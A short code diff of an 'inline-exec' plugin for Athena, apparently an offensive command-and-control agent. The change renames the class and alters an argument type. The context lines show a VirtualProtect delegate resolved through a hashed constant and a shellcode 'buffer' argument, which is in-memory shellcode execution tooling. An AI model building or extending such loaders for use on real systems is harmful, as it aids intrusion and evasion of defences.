@@ -8,7 +8,7 @@ using Athena.Utilities;
 
 namespace Plugins
 {
-    public class Plugin : AthenaPlugin
+    public class InlineExec : AthenaPlugin
     {
         public override string Name => "inline-exec";
         private delegate void BufferDelegate();
@@ -29,7 +29,7 @@ namespace Plugins
         const long VirtPro = 65467780416196;
         [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
         public delegate Boolean VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-        public override void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, string> args)
         {
             byte[] buffer;
             if (args.ContainsKey("buffer"))
